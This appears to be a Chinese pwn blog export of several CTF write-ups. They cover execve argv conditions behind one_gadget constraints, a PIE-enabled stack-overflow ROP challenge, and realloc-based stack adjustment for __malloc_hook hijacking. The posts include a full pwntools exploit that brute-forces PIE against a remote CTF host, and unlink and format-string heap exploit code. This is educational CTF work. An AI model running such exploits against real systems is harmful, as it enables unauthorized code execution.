<p>感谢 <a href="https://blog.csdn.net/weixin_44864859">棂星</a> 师傅发现问题，感谢<a href="http://taqini.space/2020/04/29/about-execve/">TaQini师傅博客参考资料</a></p>
<a id="more"></a>



<h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>Linux下execve函数的描述</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], </span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>; </span><br></pre></td></tr></table></figure>

<ul>
<li><p>  argv是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数。</p>
</li>
<li><p>  envp 同样也是参数序列，一般来说他是一种键值对的形式 key=value. 作为我们是新程序的环境。</p>
</li>
</ul>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="零个参数"><a href="#零个参数" class="headerlink" title="零个参数"></a>零个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这显然可以。</p>
<h3 id="一个参数"><a href="#一个参数" class="headerlink" title="一个参数"></a>一个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="one_gadget/image-20200720225143097.png" alt="image-20200720225143097"></p>
<p>得到了一个shell，观察此时的<code>argv[]</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x555555554701 (&lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555555546f7 &lt;main+77&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x5555555546fb &lt;main+81&gt;:	mov    rsi,rcx</span><br><span class="line">   0x5555555546fe &lt;main+84&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x555555554701 &lt;main+87&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    eax,0x0</span><br><span class="line">   0x55555555470b &lt;main+97&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555470f &lt;main+101&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554718 &lt;main+110&gt;:	je     0x55555555471f &lt;main+117&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x219a7d923809200 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000555555554701	8	    execve(filename, argv, envp);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;) ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x0 ; &lt;-- NULL(合法指针) </span><br></pre></td></tr></table></figure>



<h3 id="两个参数"><a href="#两个参数" class="headerlink" title="两个参数"></a>两个参数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">&quot;asdadadas&quot;</span>, <span class="string">&quot;1.sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(filename, argv, envp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>1.sh</code>是我自己创建的一个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ cat 1.sh </span><br><span class="line">echo hello</span><br></pre></td></tr></table></figure>

<p>程序的运行结果如下</p>
<p><img src="one_gadget/image-20200720224735113.png" alt="image-20200720224735113"></p>
<p>成功运行了<code>1.sh</code>但是并没有返回一个shell，观察此时<code>argv[]</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDX: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">RDI: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">RBP: 0x7fffffffdf60 --&gt; 0x555555554730 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">RIP: 0x55555555470c (&lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x0 </span><br><span class="line">R12: 0x5555555545a0 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe040 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554702 &lt;main+88&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x555555554706 &lt;main+92&gt;:	mov    rsi,rcx</span><br><span class="line">   0x555555554709 &lt;main+95&gt;:	mov    rdi,rax</span><br><span class="line">&#x3D;&gt; 0x55555555470c &lt;main+98&gt;:	call   0x555555554580 &lt;execve@plt&gt;</span><br><span class="line">   0x555555554711 &lt;main+103&gt;:	mov    eax,0x0</span><br><span class="line">   0x555555554716 &lt;main+108&gt;:	mov    rsi,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555471a &lt;main+112&gt;:	xor    rsi,QWORD PTR fs:0x28</span><br><span class="line">   0x555555554723 &lt;main+121&gt;:	je     0x55555555472a &lt;main+128&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">arg[1]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">arg[2]: 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">arg[3]: 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf20 --&gt; 0x1 </span><br><span class="line">0008| 0x7fffffffdf28 --&gt; 0x5555555547b4 --&gt; 0x68732f6e69622f (&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">0016| 0x7fffffffdf30 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 </span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf58 --&gt; 0x6276ca1997ede900 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x000055555555470c	8	    execve(filename, argv, envp);</span><br></pre></td></tr></table></figure>

<p>观察到<code>rsi(0x7fffffffdf40)</code>处的值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffdf40 --&gt; 0x5555555547bc (&quot;asdadadas&quot;)  ; &lt;-- 合法指针</span><br><span class="line">0040| 0x7fffffffdf48 --&gt; 0x5555555547c6 --&gt; 0x1b01000068732e31 ; &lt;-- 合法指针</span><br><span class="line">0048| 0x7fffffffdf50 --&gt; 0x0 ; &lt;-- NULL(合法指针)</span><br></pre></td></tr></table></figure>

<p>发现并不能getshell</p>
<h2 id="one-gadget限制"><a href="#one-gadget限制" class="headerlink" title="one_gadget限制"></a>one_gadget限制</h2><p>使用<code>one_gadget</code>都有限制条件，例如<code>libc-2.27.so</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@shiroha:/mnt/hgfs/sharedPwn/vn_2020_simpleHeap$ one_gadget ../libc-2.27.so </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>但是其实规则应该变成</p>
<ol>
<li> <code>[rsp+0x30(举例)] == NULL</code> </li>
<li> <code>[rsp+0x30] == (pointer)</code> &amp;&amp; <code>[rsp+0x38] == NULL</code></li>
</ol>
<h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>师傅给的题是<code>vn_2020_simpleHeap</code></p>
<p>exp最后<code>realloc</code>调整栈的时候调到<code>+0xC</code>的地方，发现不满足条件</p>
<img src="one_gadget/image-20200720230640839.png" alt="image-20200720230640839" style="zoom:50%;" />

<p>得到了shell：</p>
<img src="one_gadget/image-20200720230708171.png" alt="image-20200720230708171" style="zoom:50%;" />]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>一道开了pie的ROP题</title>
    <url>//pie-rop.html</url>
    <content><![CDATA[<p>main函数的ROP以及开启pie</p>
<a id="more"></a>

<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  read_n(&amp;s, 0x100uLL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>

<h3 id="read-n"><a href="#read-n" class="headerlink" title="read_n"></a>read_n</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *__fastcall read_n(void *a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; &#x2F;&#x2F; eax</span><br><span class="line">  char s[520]; &#x2F;&#x2F; [rsp+10h] [rbp-210h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+218h] [rbp-8h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+21Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( a2 &gt; 0x200 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;too long!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;s[v6], 1uLL);</span><br><span class="line">    if ( s[v6] &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( !s[v6] )</span><br><span class="line">      break;</span><br><span class="line">    v2 &#x3D; v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( a2 &gt; v2 );</span><br><span class="line">  if ( s[v6] &#x3D;&#x3D; 10 &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; strlen(s);</span><br><span class="line">  return memcpy(a1, s, v5);</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>

<p>漏洞点是main函数存在栈溢出</p>
<p>但是main函数结束之后的返回地址是 <code>__libc_start_main+231</code></p>
<img src="./pie-rop/main_ret.jpg" alt="main_ret" style="zoom:25%;" />

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>观察到<code>ret+0x20</code>的地方是main函数的入口地址，所以只要让函数在ret的时候，ret到<code>__libc_start_main</code>附近的 <code>pop pop pop ret</code> 就可以返回到main函数</p>
<p>于此同时，之前的puts函数会泄漏libc的地址</p>
<p>由于开了pie，导致程序的基址不确定，但是最后的12位是确定的，有4位不确定，需要爆破。有1/16的概率成功。 找一个合适的pppr地址</p>
<img src="./pie-rop/ropgadget.png" alt="ropgadget" style="zoom:25%;" />

<p>返回到main之后就是基础的rop了</p>
<img src="./pie-rop/getshell.png" alt="getshell" style="zoom:25%;" />

<h2 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h2><p>本来想用<code>system(&quot;/bin/sh&quot;);</code>的，但是失败了，因为read_n函数会在读取到\x00的时候截断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; 0</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def dbg(command &#x3D; &quot;&quot;):</span><br><span class="line">    global sh</span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    input()</span><br><span class="line"></span><br><span class="line">def leakBase():</span><br><span class="line">    global sh</span><br><span class="line">    #sh &#x3D; process(&quot;.&#x2F;easypwn&quot;, env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;&#125;)</span><br><span class="line">    sh &#x3D; remote(&quot;nc.eonew.cn&quot;,&quot;10004&quot;)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x88 + &#39;\x51&#39; + &#39;\x13&#39;</span><br><span class="line">    #dbg(&quot;codebase&quot;)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    c &#x3D; sh.recvline()[-7:-1].ljust(8, &#39;\x00&#39;)</span><br><span class="line">    addr &#x3D; u64(c) - 0x0000000000021351</span><br><span class="line">    print(&quot;libc &#x3D;&#x3D;&gt; &quot; + hex(addr))</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    try:</span><br><span class="line">        base &#x3D; leakBase()</span><br><span class="line">        pop_rdi &#x3D; 0x000000000002155f + base</span><br><span class="line">        libc &#x3D; ELF(&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;)</span><br><span class="line">        system &#x3D; base + 0x4f322</span><br><span class="line">        sleep(0.3)</span><br><span class="line">        print(&quot;system &#x3D;&#x3D;&gt; &quot; + hex(system))</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88 + p64(system)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.sendline(&quot;ls&quot;)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>one_gadget 使用realloc调整栈</title>
    <url>//realloc_stack.html</url>
    <content><![CDATA[<p>在 pwn 做题的时候,偶尔会碰到 one_gadget 全部不满足条件的情况,这就需要使用 <code>realloc</code> 来调整栈</p>
<a id="more"></a>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在劫持 <code>__malloc_hook</code> 之后由于栈不可调整,所以有时候会不满足 <code>one_gadget</code> 的触发条件<br>在 <code>realloc</code> 函数中,有 6 个<code>push</code> 操作,可以调整栈的情况<br>而且 <code>realloc</code> 会调用 <code>__realloc_hook</code> , <code>__realloc_hook</code> 就在 <code>__malloc_hook</code> 附近</p>
<h2 id="realloc-的-push-操作"><a href="#realloc-的-push-操作" class="headerlink" title="realloc 的 push 操作"></a>realloc 的 push 操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="line">.text:00000000000846C0                                         ; LOAD:000000000000CF48↑o ...</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 var_60          &#x3D; qword ptr -60h</span><br><span class="line">.text:00000000000846C0 var_58          &#x3D; byte ptr -58h</span><br><span class="line">.text:00000000000846C0 var_48          &#x3D; byte ptr -48h</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8</span><br></pre></td></tr></table></figure>

<h2 id="调整实战"><a href="#调整实战" class="headerlink" title="调整实战"></a>调整实战</h2><p>用的是 <code>axb_2019_heap</code><br>一个很常见的溢出,使用 <code>unlink</code> ,得到任意地址读写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>直接使用 <code>one_gadget[1]</code> 发现栈并不满足条件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(one_gadget))</span><br></pre></td></tr></table></figure>
<p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924384776.png" alt="file"></p>
<p>需要用 <code>realloc</code> 来调整栈</p>
<h3 id="调整技巧"><a href="#调整技巧" class="headerlink" title="调整技巧"></a>调整技巧</h3><p>首先看到 <code>realloc</code> 函数的汇编,在 <code>offset = 0x10</code> 的地方有一个 <code>sub rsp,38h</code>,因为这一句是在所有的 <code>push</code> 操作完了之后,所以必定会执行,而且影响栈的分布, 所以先控制 <code>__malloc_hook</code> 指向 <code>realloc + 0x10</code> 同时 <code>__realloc_hook</code> 指向 <code>one_gadget</code><br>观察这个时候栈的分布<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924728797.png" alt="file"></p>
<p>先来解释一下 <code>x/8gx $rsp + 0x30 - 0x30</code><br>因为需要满足条件的地址是 <code>$rsp + 0x30</code> ,而且 <code>push</code> 操作有 6 个,每个影响是 <code>0x8</code></p>
